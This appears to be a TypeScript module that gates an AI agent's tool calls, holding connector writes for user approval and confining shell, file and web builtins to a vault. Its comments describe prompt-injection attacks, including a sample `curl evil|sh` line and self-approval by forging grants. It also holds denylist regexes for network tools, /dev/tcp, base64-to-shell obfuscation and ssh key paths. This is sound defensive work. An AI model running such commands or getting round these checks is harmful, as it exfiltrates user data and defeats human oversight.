// The Action Gateway (G1, docs/sensitive-egress-guard.md sibling): closes the
// guardrail side door. The gws spine governs Google writes, but app chats
// inherit the user's claude.ai connectors (PayPal, Gmail, ...) and any user
// MCP server - tools that ACT ON THE WORLD without passing
// the approval queue, the email policy, or the egress guard.
//
// Mechanism: every engine-spawned claude turn carries a PreToolUse hook
// (`prevail act-gate-hook`) - verified to fire even under
// --dangerously-skip-permissions. The hook classifies each MCP tool call:
//   read-shaped        -> allow (runs live, like gws reads)
//   engine-owned server-> allow (google_workspace/prevail self-gate their writes)
//   write-shaped or
//   unknown            -> DENY + queue a pending act for the user's approval,
//                         with egress-guard categories attached
// Approval mints a short-lived, single-use GRANT bound to the exact
// (tool, args) hash; the model's retry with identical arguments passes once.
// Unlike gws (where approval executes server-side), a connector act re-runs
// through the model - the tool only exists inside its session.
//
// Same design rules as the egress guard: deterministic, code-enforced at the
// execution boundary, bias toward holding.

import { createHash, randomUUID } from "node:crypto";
import { existsSync, mkdirSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
import { dirname, join, resolve as pathResolve } from "node:path";
import { tryAcquireLock } from "./file-lock.ts";
import { scanSensitive, findingCategories, readEgressGuard } from "./egress-guard.ts";
import { auditAction } from "./action-audit.ts";
import { foreignDomainOf } from "./agent-contract.ts";
import { classifyAction, type ActionClass } from "./action-policy.ts";
import { isTrustedFetch, isTrustedReadTool } from "./trusted-sources.ts";
import { missionScopeSlug } from "./path-safety.ts";
import { readMission } from "./missions.ts";
import { ceilingRank } from "./specialists.ts";

export interface PendingAct {
  id: string;
  domain: string;
  /** Human summary: "PayPal: create-invoice". */
  summary: string;
  tool: string;
  /** JSON of the tool arguments, verbatim (what the grant is bound to). */
  argsJson: string;
  /** Egress-guard category labels found in the arguments (honest, no values). */
  categories: string[];
  ts: number;
  /** The Prevail thread (chat session) whose turn hit the gate, when known
   *  (PREVAIL_THREAD_ID on the spawned turn). Absent on paths with no thread. */
  thread?: string;
}

/** What `acts pending-list` prints: the stored act plus its risk class and
 *  whether an "Always allow" rule may be offered for it. Derived on read, so
 *  acts queued by an older build get them too. */
export interface PendingActView extends PendingAct {
  actionClass: ActionClass;
  alwaysEligible: boolean;
}

/** An "Always allow" rule: this tool, in this domain, runs without asking,
 *  as long as the call is not consequential and carries nothing sensitive. */
export interface ActRule {
  tool: string;
  domain: string;
  ts: number;
}

interface ActDenial {
  hash: string;
  ts: number;
}

interface ActGrant {
  hash: string;
  allowSensitive: boolean;
  expires: number;
}

const GRANT_TTL_MS = 10 * 60 * 1000; // approval is good for one retry within 10 minutes
export const DENIAL_TTL_MS = 30 * 60 * 1000; // a declined (tool, args) stays declined for 30 minutes

/** Machine marker appended to every queue-deny reason. The desktop finds it in
 *  a tool result and renders the approval card in the chat flow. Stable. */
export const actMarker = (id: string) => `[prevail-act:${id}]`;

/** What the model is told when it retries something the user declined. */
export const DECLINED_REASON =
  "The user declined this action. It was not run. Do not retry it or try another route; tell the user it was not done.";

const pendingPath = (vault: string) => join(vault, "_meta", "pending_acts.json");
const grantsPath = (vault: string) => join(vault, "_meta", "act_grants.json");
const denialsPath = (vault: string) => join(vault, "_meta", "act_denials.json");
const rulesPath = (vault: string) => join(vault, "_meta", "act_rules.json");

function readJson<T>(path: string, fallback: T): T {
  try { return JSON.parse(readFileSync(path, "utf8")) as T; } catch { return fallback; }
}
function writeJson(path: string, value: unknown): void {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, JSON.stringify(value, null, 1));
}

export function actHash(tool: string, argsJson: string): string {
  return createHash("sha256").update(`${tool}\n${argsJson}`).digest("hex").slice(0, 32);
}

// ── Classification ───────────────────────────────────────────────────────────
// Engine-owned servers gate their own writes (google_workspace queues, prevail
// tools write only inside the vault); everything they do is allowed here.
const ENGINE_OWNED = /^mcp__(google_workspace|prevail|prevail_sources)(__|$)/;

// Read-shaped verbs: run live. Matched against the tool's last segment.
// NOTE: `export` and `download` are deliberately NOT read verbs. An
// `export-design` / `download_file` style tool moves a whole document to a
// shareable/local location — an exfiltration vector — so it must gate for
// approval, not run live under a read classification.
const READ_RE = /(^|[-_])(get|list|search|read|fetch|find|query|browse|check|describe|view|status|help|info|show|lookup|suggest|estimate|preview|count|report|answer|resolve|discover|authenticate|complete[-_]authentication)([-_]|$)/i;

// Write-shaped verbs: unmistakably act on the world.
const WRITE_RE = /(^|[-_])(create|send|update|delete|post|add|remove|pay|publish|insert|set|write|cancel|refund|transfer|invoice|reply|submit|upload|move|archive|trash|modify|execute|apply|label|merge|copy|import|assign|save|start|commit|book|order|buy|purchase|schedule|respond|toggle|switch|claim)([-_]|$)/i;

export type ActVerdict = "allow" | "gate";

/** Classify one tool call. Non-MCP builtins (Bash, Read, WebFetch...) are the
 *  runtime's own tools, governed by Vault Lock / web lockdown - not gated here. */
export function classifyAct(toolName: string): ActVerdict {
  if (!toolName.startsWith("mcp__")) return "allow";
  if (ENGINE_OWNED.test(toolName)) return "allow";
  const leaf = toolName.split("__").pop() ?? toolName;
  // The LEADING verb names the operation ("get-order" reads an order;
  // "create-order" writes one), so it decides when recognized. Only when the
  // first token is no verb at all do we scan the whole name, write-first.
  const head = (leaf.split(/[-_]/)[0] ?? "").toLowerCase();
  if (READ_RE.test(head)) return "allow";
  if (WRITE_RE.test(head)) return "gate";
  if (WRITE_RE.test(leaf)) return "gate";
  if (READ_RE.test(leaf)) return "allow";
  return "gate"; // unknown = write, same paranoid default as the gws classifier
}

/** Human summary from an mcp tool name: "claude_ai_PayPal create-invoice". */
export function actSummary(toolName: string): string {
  const parts = toolName.split("__");
  const server = (parts[1] ?? "").replace(/^claude_ai_/, "").replace(/_/g, " ");
  return `${server}: ${parts[2] ?? parts[1] ?? toolName}`;
}

/** Risk class of a connector call. classifyAction matches whole words, and a
 *  tool leaf like "create_invoice" is one word to \b, so split on the
 *  separators (and camelCase) first: "PayPal: create invoice" -> financial. */
export function actClass(toolName: string): ActionClass {
  const words = actSummary(toolName).replace(/([a-z])([A-Z])/g, "$1 $2").replace(/[-_]+/g, " ");
  return classifyAction(words);
}

/** An act may carry an "Always allow" rule only when its name reads as a
 *  known low-risk write (edit, draft, save) or a read, and the egress scan
 *  found nothing. An allowlist, not "not consequential": the classifier is
 *  keyword-based, so a tool it cannot place ("make_payment", "submit_order",
 *  "execute_trade" all come back "unknown") must never earn a standing rule. */
const ALWAYS_CLASSES: ReadonlySet<ActionClass> = new Set<ActionClass>(["reversible", "read"]);
export function isAlwaysEligible(toolName: string, categories: readonly string[]): boolean {
  return ALWAYS_CLASSES.has(actClass(toolName)) && categories.length === 0;
}

// ── Queue + grants (file-locked; lock the .lock sibling, never the data) ─────
export function readPendingActs(vault: string): PendingAct[] {
  return readJson<PendingAct[]>(pendingPath(vault), []);
}

/** The pending queue as `acts pending-list` prints it. */
export function readPendingActsView(vault: string): PendingActView[] {
  return readPendingActs(vault).map((a) => ({
    ...a,
    actionClass: actClass(a.tool),
    alwaysEligible: isAlwaysEligible(a.tool, a.categories ?? []),
  }));
}

// Sync critical section: acquire the .lock sibling (NEVER the data file - the
// lock is created at, and deleted from, the exact path given), run, release.
function locked(path: string, fn: () => void): void {
  const lock = tryAcquireLock(`${path}.lock`);
  try { fn(); } finally { lock?.release(); }
}

export function removePendingAct(vault: string, id: string): void {
  locked(pendingPath(vault), () => {
    const items = readPendingActs(vault).filter((a) => a.id !== id);
    writeJson(pendingPath(vault), items);
  });
}

function addPendingAct(vault: string, act: Omit<PendingAct, "id" | "ts">): PendingAct {
  const rec: PendingAct = { ...act, id: `act_${randomUUID().slice(0, 12)}`, ts: Date.now() };
  locked(pendingPath(vault), () => {
    const items = readPendingActs(vault);
    // Same (tool,args) already queued -> reuse it instead of stacking dupes
    // when the model retries before approval.
    const dupe = items.find((a) => a.tool === rec.tool && a.argsJson === rec.argsJson);
    if (dupe) {
      rec.id = dupe.id; rec.ts = dupe.ts;
      // A retry from a known thread fills in a thread the first attempt lacked.
      if (rec.thread && !dupe.thread) { dupe.thread = rec.thread; writeJson(pendingPath(vault), items); }
      return;
    }
    items.push(rec);
    writeJson(pendingPath(vault), items);
  });
  return rec;
}

/** Approve one pending act: mint the single-use grant its retry will consume.
 *  `allowSensitive` is the explicit second tap when categories were found.
 *  `always` also saves a (tool, domain) rule so later non-consequential,
 *  non-sensitive calls of that tool run without asking; an ineligible act is
 *  refused outright and nothing is approved. */
export function approvePendingAct(vault: string, id: string, allowSensitive = false, always = false): { ok: boolean; error?: string } {
  const act = readPendingActs(vault).find((a) => a.id === id);
  if (!act) return { ok: false, error: "no such pending act" };
  if (always && !isAlwaysEligible(act.tool, act.categories ?? [])) {
    return { ok: false, error: "not eligible for always-allow" };
  }
  if (act.categories.length > 0 && !allowSensitive) {
    return { ok: false, error: `this action carries ${act.categories.join("; ")} - approve it with sensitive info explicitly allowed` };
  }
  locked(grantsPath(vault), () => {
    const grants = readJson<ActGrant[]>(grantsPath(vault), []).filter((g) => g.expires > Date.now());
    grants.push({ hash: actHash(act.tool, act.argsJson), allowSensitive, expires: Date.now() + GRANT_TTL_MS });
    writeJson(grantsPath(vault), grants);
  });
  removePendingAct(vault, id);
  if (always) saveActRule(vault, act.tool, act.domain);
  auditAction(vault, {
    ts: Date.now(), domain: act.domain, action: act.summary,
    outcome: "proposed", report: `user approved connector act ${act.tool} (grant minted${allowSensitive ? ", sensitive released" : ""}${always ? ", always-allow rule saved" : ""})`,
  });
  return { ok: true };
}

/** Decline one pending act: drop it and remember its (tool, args) hash for
 *  DENIAL_TTL_MS, so the model's retry is refused at once instead of queueing
 *  the same thing again. (`acts dismiss` only clears; the agent is not told.) */
export function denyPendingAct(vault: string, id: string): { ok: boolean; error?: string } {
  const act = readPendingActs(vault).find((a) => a.id === id);
  if (!act) return { ok: false, error: "no such pending act" };
  const now = Date.now();
  locked(denialsPath(vault), () => {
    const denials = readJson<ActDenial[]>(denialsPath(vault), []).filter((d) => now - d.ts < DENIAL_TTL_MS);
    denials.push({ hash: actHash(act.tool, act.argsJson), ts: now });
    writeJson(denialsPath(vault), denials);
  });
  removePendingAct(vault, id);
  auditAction(vault, {
    ts: now, domain: act.domain, action: act.summary,
    outcome: "denied", report: `user declined connector act ${act.tool}; it was not run`,
  });
  return { ok: true };
}

function isDenied(vault: string, hash: string): boolean {
  const now = Date.now();
  return readJson<ActDenial[]>(denialsPath(vault), []).some((d) => d.hash === hash && now - d.ts < DENIAL_TTL_MS);
}

// ── Always-allow rules (per tool, per domain) ────────────────────────────────
export function readActRules(vault: string): ActRule[] {
  const rules = readJson<ActRule[]>(rulesPath(vault), []);
  return Array.isArray(rules) ? rules.filter((r) => r && typeof r.tool === "string" && typeof r.domain === "string") : [];
}

function saveActRule(vault: string, tool: string, domain: string): void {
  locked(rulesPath(vault), () => {
    const rules = readActRules(vault).filter((r) => !(r.tool === tool && r.domain === domain));
    rules.push({ tool, domain, ts: Date.now() });
    writeJson(rulesPath(vault), rules);
  });
}

/** Remove one rule. Idempotent: revoking a rule that is not there is fine. */
export function revokeActRule(vault: string, tool: string, domain: string): { ok: boolean } {
  locked(rulesPath(vault), () => {
    const rules = readActRules(vault);
    const next = rules.filter((r) => !(r.tool === tool && r.domain === domain));
    if (next.length !== rules.length) writeJson(rulesPath(vault), next);
  });
  return { ok: true };
}

function hasActRule(vault: string, tool: string, domain: string): boolean {
  return readActRules(vault).some((r) => r.tool === tool && r.domain === domain);
}

/** Consume a grant if one matches. Single-use: a matching grant is removed. */
function consumeGrant(vault: string, hash: string): ActGrant | null {
  let hit: ActGrant | null = null;
  locked(grantsPath(vault), () => {
    const grants = readJson<ActGrant[]>(grantsPath(vault), []).filter((g) => g.expires > Date.now());
    const i = grants.findIndex((g) => g.hash === hash);
    if (i >= 0) hit = grants.splice(i, 1)[0]!;
    writeJson(grantsPath(vault), grants);
  });
  return hit;
}

// ── Engine acts: the engine's own writes that wait in the same queue ───────
// The Operator's actions and MCP mission writes (create, status, complete)
// are queued like a connector write, so the user answers them in the Inbox
// with the same Allow / Deny. A tool name here never starts with mcp__prevail
// (that prefix is the engine's own read server and always runs).
export const OPERATOR_TOOL = "mcp__prevail-operator__act";
export const MISSION_TOOL_PREFIX = "mcp__prevail-missions__";

/**
 * The gate for an engine act: "allow" when the user approved this exact call
 * (a grant, consumed now), "declined" when they said no in the last 30
 * minutes, otherwise it is queued (once) with a readable summary and "queued"
 * comes back with the act id.
 */
export function gateEngineAct(vault: string, domain: string, tool: string, args: unknown, summary: string): { state: "allow" | "declined" | "queued"; id?: string } {
  const argsJson = JSON.stringify(args ?? {});
  const hash = actHash(tool, argsJson);
  if (isDenied(vault, hash)) return { state: "declined" };
  if (consumeGrant(vault, hash)) {
    auditAction(vault, { ts: Date.now(), domain, action: summary.slice(0, 280), outcome: "executed", report: `ran under user grant (${tool})` });
    return { state: "allow" };
  }
  // Scan what the act would carry out (its summary), not the JSON wrapping:
  // JSON's own quote marks read as a verbatim quote.
  const findings = readEgressGuard() === "on" ? scanSensitive(summary) : [];
  const rec = addPendingAct(vault, { domain, summary: summary.slice(0, 200), tool, argsJson, categories: findingCategories(findings) });
  auditAction(vault, { ts: Date.now(), domain, action: summary.slice(0, 280), outcome: "proposed", report: `queued for approval (${tool})` });
  return { state: "queued", id: rec.id };
}

/** The pending act with this id, before an answer removes it from the queue. */
export function pendingAct(vault: string, id: string): PendingAct | null {
  return readPendingActs(vault).find((a) => a.id === id) ?? null;
}

// ── Builtin-tool boundary (C1) ───────────────────────────────────────────────
// The connector gate above covers MCP tools. But an `act` run also hands the
// model its RUNTIME BUILTINS - Bash, Write, Edit, Read, WebFetch, WebSearch -
// under --dangerously-skip-permissions. Vault Lock for those was only a
// system-prompt request, which an injected instruction overrides. So a
// prompt-injected email read during an autonomous run could `Bash: curl evil|sh`
// or `Write` outside the vault, bypassing the approval queue AND the egress
// guard entirely. This is the technical boundary that was missing.
//
// When Vault Lock is ON (the default), file builtins are confined to the vault
// by deterministic path resolution (robust), and Bash / web fetches that reach
// the network are denied (a denylist - the weaker link; OS-sandboxing the agent
// is the stronger follow-up, tracked). Turning Vault Lock OFF is an explicit,
// trust-ribbon-visible choice that restores unconfined builtins.

// Commands that open a network connection - the exfil / remote-code channel.
const NET_CMD_RE = /\b(curl|wget|nc|ncat|netcat|telnet|ssh|scp|sftp|ftp|rsync|socat|nmap)\b/;
// In-language network escapes (python/node/ruby/perl one-liners, /dev/tcp).
const NET_ESCAPE_RE = /\/dev\/(tcp|udp)\/|urllib|requests\.(get|post)|http\.client|socket\.|fetch\(|https?:\/\/|import\s+urllib|net\/http|Net::HTTP|LWP::/i;
// Home-directory references. A confined run has no business touching the home
// dir (~/Library/LaunchAgents persistence, ~/.ssh, browser cookies, other
// apps' data). The absolute-path scan below only catches tokens starting with
// "/", so `~/…`, `$HOME/…`, `${HOME}/…` slipped straight through.
const HOME_REF_RE = /(^|[\s"'=(])(~\/|~$|\$HOME\b|\$\{HOME\})/;
// Decode-then-execute obfuscation. `echo <b64> | base64 -d | sh` and friends
// hide a `curl`/network payload from the plain keyword scan above; likewise an
// interpreter fed decoded bytes. Not exhaustive (the real fix is OS sandboxing,
// tracked), but it closes the cheapest, most common bypasses.
const OBFUSC_EXEC_RE = /\b(base64|base32|xxd|openssl\s+enc|uudecode)\b[\s\S]*\|\s*(sh|bash|zsh|dash|python[0-9.]*|node|perl|ruby|osascript)\b|\beval\b|\|\s*(sh|bash|zsh)\s*$/;

function withinVault(vault: string, target: string): boolean {
  try {
    const vroot = realpathSync(vault);
    const abs = pathResolve(vault, target);
    // Canonicalize the nearest EXISTING ancestor (so a not-yet-created file
    // still gets symlink normalization - e.g. /tmp -> /private/tmp on macOS),
    // then re-append the missing tail. Catches `..` escapes and symlink-outs.
    let dir = abs;
    const tail: string[] = [];
    while (true) {
      try { dir = realpathSync(dir); break; }
      catch {
        const parent = pathResolve(dir, "..");
        if (parent === dir) { dir = vroot; break; } // reached root without existing
        tail.unshift(dir.slice(parent.length + 1));
        dir = parent;
      }
    }
    const resolved = tail.length ? `${dir}/${tail.join("/")}` : dir;
    return resolved === vroot || resolved.startsWith(vroot + "/");
  } catch { return false; }
}

// Engine control state the model must never write: the act grants/pending
// queue (<vault>/_meta), autonomy + action policy (build/_meta), and every
// other `_meta` dir. These all sit INSIDE the confinement root, so without
// this check a prompt-injected act run could Write a grant for its own
// (tool, args) hash, or flip autonomy to "auto", and self-approve.
function touchesControlState(vault: string, target: string): boolean {
  const abs = pathResolve(vault, target);
  return abs.split(/[\\/]+/).some((seg) => seg === "_meta");
}
const CONTROL_REF_RE = /(^|[^A-Za-z0-9_])_meta([^A-Za-z0-9_]|$)|act_grants|pending_acts/;
// Absolute path tokens in a shell command, including quoted, redirected and
// assigned ones ("/x", >/x, A=/x, a:/x) - a bare-whitespace-only scan missed
// `cat "/Users/me/.ssh/id_rsa"`.
const ABS_PATH_RE = /(?:^|[\s"'=<>:(;|&`])(\/[^\s"';|&<>)`]+)/g;
// `cd` with no argument (or `cd ;`) lands in $HOME without ever naming it.
const BARE_CD_RE = /(^|[;&|(\s])(cd|pushd)\s*($|[;&|)])/;
// A `..` path component: relative climbs out of the domain dir (`cat
// ../../../.ssh/id_rsa`) that the absolute-path scan never sees.
const DOTDOT_RE = /(^|[\s"'=<>:\/(])\.\.($|[\s"'\/;|&)])/;

function pathFromInput(input: unknown): string | null {
  if (input && typeof input === "object") {
    const o = input as Record<string, unknown>;
    for (const k of ["file_path", "path", "notebook_path", "filePath"]) {
      if (typeof o[k] === "string" && o[k]) return o[k] as string;
    }
  }
  return null;
}

/** Gate one BUILTIN tool call when Vault Lock is on. Returns null to defer to
 *  the normal connector classifier (non-builtin), else an allow/deny. */
export function gateBuiltin(vault: string, vaultLockOn: boolean, toolName: string, toolInput: unknown): GateDecision | null {
  const name = toolName;
  const isFileWrite = name === "Write" || name === "Edit" || name === "NotebookEdit" || name === "MultiEdit";
  // Grep/Glob/LS read file contents or listings just like Read does; leaving
  // them ungated let a confined run Grep `/Users/me/.ssh` for key material.
  const isFileRead = name === "Read" || name === "Grep" || name === "Glob" || name === "LS";
  const isBash = name === "Bash";
  const isWeb = name === "WebFetch" || name === "WebSearch";
  if (!isFileWrite && !isFileRead && !isBash && !isWeb) return null; // not a builtin we gate
  if (!vaultLockOn) return { action: "allow" }; // user turned confinement off (visible choice)

  if (isFileWrite || isFileRead) {
    const target = pathFromInput(toolInput);
    if (target && !withinVault(vault, target)) {
      return { action: "deny", reason: `Vault Lock is on: ${name} may only touch files inside your vault. "${target}" is outside it and was blocked. Work within the vault, or the user can turn off Vault Lock in Privacy.` };
    }
    if (isFileWrite && target && touchesControlState(vault, target)) {
      return { action: "deny", reason: `${name} to "${target}" was blocked: _meta holds Prevail's approval grants and autonomy policy, which only the user can change.` };
    }
    return { action: "allow" };
  }
  if (isWeb) {
    // A trusted web or links source (apps add-source) may be read: WebFetch is
    // a GET, and only to a host in the _meta registry the model cannot edit.
    if (name === "WebFetch" && isTrustedFetch(vault, toolInput)) return { action: "allow" };
    return { action: "deny", reason: `Vault Lock is on: ${name} (outbound web) is blocked so nothing can be fetched from or leaked to the network during a confined run. Work from the vault, or the user can turn off Vault Lock.` };
  }
  if (isBash) {
    const cmd = (toolInput && typeof toolInput === "object" ? String((toolInput as Record<string, unknown>).command ?? "") : "");
    if (NET_CMD_RE.test(cmd) || NET_ESCAPE_RE.test(cmd)) {
      return { action: "deny", reason: `Vault Lock is on: that shell command reaches the network, which is blocked during a confined run (it could exfiltrate data or fetch code). Remove the network call, or the user can turn off Vault Lock.` };
    }
    if (OBFUSC_EXEC_RE.test(cmd)) {
      return { action: "deny", reason: `Vault Lock is on: that shell command decodes-and-executes or evaluates data, which is blocked during a confined run (it can hide a network call or run arbitrary code). Run the command in the clear, or the user can turn off Vault Lock.` };
    }
    if (HOME_REF_RE.test(cmd)) {
      return { action: "deny", reason: `Vault Lock is on: that shell command references your home directory (~ or $HOME), which is outside the vault. Blocked. Work within the vault, or the user can turn off Vault Lock.` };
    }
    if (CONTROL_REF_RE.test(cmd)) {
      return { action: "deny", reason: `Vault Lock is on: that shell command touches Prevail's _meta control state (approval grants, autonomy policy), which only the user can change. Blocked.` };
    }
    if (BARE_CD_RE.test(cmd) || DOTDOT_RE.test(cmd)) {
      return { action: "deny", reason: `Vault Lock is on: that shell command climbs out of the working directory (bare cd or a ".." path). Use absolute paths inside the vault instead, or the user can turn off Vault Lock.` };
    }
    // Absolute paths clearly outside the vault in the command are also blocked.
    const outsideAbs = [...cmd.matchAll(ABS_PATH_RE)].map((m) => m[1]!);
    for (const p of outsideAbs) {
      if (p.startsWith("/") && !withinVault(vault, p) && !/^\/(usr|bin|opt|tmp|private\/tmp|var\/folders|dev\/null|System\/Library)/.test(p)) {
        return { action: "deny", reason: `Vault Lock is on: that shell command touches "${p}", outside your vault. Blocked. Work within the vault, or the user can turn off Vault Lock.` };
      }
    }
    return { action: "allow" };
  }
  return null;
}

// ── The gate itself (what the PreToolUse hook calls) ─────────────────────────
export interface GateDecision {
  action: "allow" | "deny";
  reason?: string;
}

export function gateToolCall(vault: string, domain: string, toolName: string, toolInput: unknown, vaultLockOn = true, opts: { thread?: string } = {}): GateDecision {
  // One writer per folder (agent mesh): a domain agent writes only its own
  // folder, Vault Lock or not. Anything for another domain is a handoff.
  if (toolName === "Write" || toolName === "Edit" || toolName === "MultiEdit" || toolName === "NotebookEdit") {
    const target = pathFromInput(toolInput);
    const other = target ? foreignDomainOf(vault, domain, target) : null;
    if (other) {
      auditAction(vault, { ts: Date.now(), domain, action: `builtin ${toolName}`, outcome: "blocked_by_egress_guard", report: `wrote into ${other}, which ${domain} does not own` });
      return { action: "deny", reason: `${toolName} into the ${other} folder was blocked: the ${domain} agent writes only its own folder. Hand it off instead: add a task to ${other} (Prevail add_task) that starts "From ${domain}:" with the event, amount, date and source file.` };
    }
  }
  // C1: builtins first - the technical Vault Lock boundary.
  const builtin = gateBuiltin(vault, vaultLockOn, toolName, toolInput);
  if (builtin) {
    if (builtin.action === "deny") {
      auditAction(vault, { ts: Date.now(), domain, action: `builtin ${toolName}`, outcome: "blocked_by_egress_guard", report: builtin.reason ?? "blocked by Vault Lock" });
    }
    return builtin;
  }
  if (classifyAct(toolName) === "allow") return { action: "allow" };
  // A mission's ceiling only tightens (missions-plan.md): a read-only mission
  // never writes, and below "act" no always-allow rule lets a write run alone.
  const mission = missionGate(vault, domain);
  if (mission?.readOnly) {
    auditAction(vault, { ts: Date.now(), domain, action: actSummary(toolName), outcome: "blocked_by_egress_guard", report: `project ceiling is read (${toolName})` });
    return { action: "deny", reason: "This project is read-only (its ceiling is read), so this action was NOT run. Tell the user; they can raise the ceiling on the project's Setup tab." };
  }
  // A trusted remote MCP source's read tools (readOnlyHint at add time) run live.
  if (isTrustedReadTool(vault, toolName)) return { action: "allow" };
  const argsJson = JSON.stringify(toolInput ?? {});
  const hash = actHash(toolName, argsJson);
  // The user already said no to this exact call: refuse without re-queueing,
  // so a retry loop cannot put the same card back in front of them.
  if (isDenied(vault, hash)) return { action: "deny", reason: DECLINED_REASON };
  // Egress scan on everything the tool would carry out of the system.
  const findings = readEgressGuard() === "on" ? scanSensitive(argsJson) : [];
  const categories = findingCategories(findings);
  // An "Always allow" rule covers only the harmless shape: never a
  // consequential call and never one carrying sensitive data. Those fall
  // through to the grant check and the queue like any other.
  if (!mission?.askAlways && hasActRule(vault, toolName, domain) && isAlwaysEligible(toolName, categories)) {
    auditAction(vault, {
      ts: Date.now(), domain, action: actSummary(toolName),
      outcome: "executed", report: `ran under always-allow rule (${toolName})`,
    });
    return { action: "allow" };
  }
  const grant = consumeGrant(vault, hash);
  if (grant && (categories.length === 0 || grant.allowSensitive)) {
    auditAction(vault, {
      ts: Date.now(), domain, action: actSummary(toolName),
      outcome: "executed", report: `connector act ran under user grant (${toolName})`,
    });
    return { action: "allow" };
  }
  const rec = addPendingAct(vault, { domain, summary: actSummary(toolName), tool: toolName, argsJson, categories, ...(opts.thread ? { thread: opts.thread } : {}) });
  auditAction(vault, {
    ts: Date.now(), domain, action: rec.summary,
    outcome: "proposed", report: `connector act queued for approval (${toolName})${categories.length ? ` - carries ${categories.join("; ")}` : ""}`,
  });
  const sens = categories.length ? ` It carries ${categories.join("; ")}, so approving requires the explicit sensitive-info release.` : "";
  return {
    action: "deny",
    reason:
      `This action was NOT run. Prevail queued it for the user's approval under Needs You (id ${rec.id}).${sens} ` +
      `Tell the user what you are trying to do and that it awaits their approval; after they approve, call this exact tool with the exact same arguments to run it. Do not attempt another route. ${actMarker(rec.id)}`,
  };
}

/** The mission a `_mission-<slug>` chat runs in: is it read-only, and must every write ask? */
export function missionGate(vault: string, domain: string): { readOnly: boolean; askAlways: boolean } | null {
  const slug = missionScopeSlug(domain);
  if (!slug) return null;
  try {
    const m = readMission(vault, slug);
    if (!m) return { readOnly: true, askAlways: true }; // fail closed
    return { readOnly: ceilingRank(m.ceiling) <= ceilingRank("read"), askAlways: ceilingRank(m.ceiling) < ceilingRank("act") };
  } catch { return { readOnly: true, askAlways: true }; }
}

// ── Claude hook settings (what cli-bridge passes as --settings) ──────────────
// One file per (vault, domain): the hook command embeds them as argv so the
// gate needs no environment plumbing. Stable path -> written once, reused.
// Dev caveat (same as gws-mcp): under `bun run` process.execPath is bun, so
// the hook only binds in compiled builds - matching the rest of the MCP stack.
export function actGateSettingsPath(vault: string, domain: string, vaultLockOn = true): string {
  const dir = join(homedirSafe(), ".prevail", "act-gate");
  mkdirSync(dir, { recursive: true });
  const key = createHash("sha256").update(`${vault}\n${domain}\n${vaultLockOn}`).digest("hex").slice(0, 12);
  const path = join(dir, `${key}.json`);
  const q = (v: string) => `"${v.replace(/(["\\$`])/g, "\\$1")}"`;
  const lock = vaultLockOn ? " --vault-lock" : "";
  const command = `${q(process.execPath)} act-gate-hook --vault ${q(vault)} --domain ${q(domain)}${lock}`;
  // Catch-all matcher (C1): the hook must see BUILTINS (Bash/Write/Edit/Read/
  // WebFetch/WebSearch), not just mcp__* connectors, or the model's own shell
  // escapes every guardrail on an act run. gateBuiltin enforces the Vault Lock
  // boundary technically; non-builtins fall through to the connector classifier.
  const settings = { hooks: { PreToolUse: [{ matcher: ".*", hooks: [{ type: "command", command }] }] } };
  const body = JSON.stringify(settings);
  try { if (existsSync(path) && readFileSync(path, "utf8") === body) return path; } catch { /* rewrite */ }
  writeFileSync(path, body);
  return path;
}

function homedirSafe(): string {
  try { return require("node:os").homedir(); } catch { return "/tmp"; }
}

/** The Prevail thread of the turn that spawned this hook: the engine sets
 *  PREVAIL_THREAD_ID on the turns it runs and Claude Code passes its env to
 *  hooks. Only a plain id is trusted (it lands in JSON the desktop routes on). */
export function threadIdFromEnv(env: NodeJS.ProcessEnv = process.env): string | undefined {
  const t = (env.PREVAIL_THREAD_ID ?? "").trim();
  return /^[A-Za-z0-9_-]{1,128}$/.test(t) ? t : undefined;
}

/** The entity an entity chat is about (PREVAIL_ENTITY_ID, set like the thread
 *  id). Only a plain <kind>/<slug> id is trusted. */
export function entityIdFromEnv(env: NodeJS.ProcessEnv = process.env): string | undefined {
  const e = (env.PREVAIL_ENTITY_ID ?? "").trim();
  return /^[a-z]{1,20}\/[A-Za-z0-9_.-]{1,128}$/.test(e) ? e : undefined;
}

/** The turn's Google account pick (PREVAIL_GOOGLE_ACCOUNT): a label, an
 *  email, a comma list or "all". Only plain selector characters are trusted. */
export function googleAccountFromEnv(env: NodeJS.ProcessEnv = process.env): string | undefined {
  const g = (env.PREVAIL_GOOGLE_ACCOUNT ?? "").trim();
  return /^[A-Za-z0-9._%+@,-]{1,256}$/.test(g) ? g : undefined;
}

/** How a gate decision reads in the app access log. */
export function accessOutcome(d: GateDecision): "ran" | "queued" | "denied" | "declined" {
  if (d.action === "allow") return "ran";
  if (d.reason === DECLINED_REASON) return "declined";
  return /\[prevail-act:[^\]]+\]/.test(d.reason ?? "") ? "queued" : "denied";
}

/** The hook entrypoint: read the Claude Code PreToolUse JSON from stdin, gate,
 *  and print the decision in the hook protocol. Never throws (a gate crash
 *  must fail CLOSED for gated tools, so unparseable input denies). */
export async function runActGateHook(vault: string, domain: string, vaultLockOn = true): Promise<void> {
  let raw = "";
  for await (const chunk of process.stdin) raw += chunk;
  let toolName = "";
  let toolInput: unknown = {};
  try {
    const input = JSON.parse(raw) as { tool_name?: string; tool_input?: unknown };
    toolName = String(input.tool_name ?? "");
    toolInput = input.tool_input ?? {};
  } catch { /* fall through: empty toolName classifies as non-MCP -> allow */ }
  if (!toolName) { process.stdout.write("{}\n"); return; }
  let decision: GateDecision;
  try {
    decision = gateToolCall(vault, domain, toolName, toolInput, vaultLockOn, { thread: threadIdFromEnv() });
  } catch (e) {
    // Fail closed for gated shapes, open for builtins.
    decision = classifyAct(toolName) === "allow"
      ? { action: "allow" }
      : { action: "deny", reason: `Prevail's action gate errored (${(e as Error).message}); the action was not run.` };
  }
  // The app access log: every MCP call that belongs to a mirrored app, reads
  // included. Recorded after the decision and never able to change it.
  if (toolName.startsWith("mcp__")) {
    try {
      const { recordAppAccess } = await import("./app-scope.ts");
      recordAppAccess(vault, toolName, toolInput, accessOutcome(decision), { thread: threadIdFromEnv(), entity: entityIdFromEnv(), domain, googleAccount: googleAccountFromEnv() });
    } catch { /* logging never blocks a tool call */ }
  }
  process.stdout.write(`${JSON.stringify(hookOutput(toolName, decision))}\n`);
}

/** The PreToolUse hook JSON for one decision (Claude Code hook protocol:
 *  hookSpecificOutput.permissionDecision). An MCP call the gate allows gets an
 *  explicit "allow", so Claude's own permission system never refuses a read
 *  the gate approved in a headless turn. Builtins it allows print {} and keep
 *  the normal permission flow. */
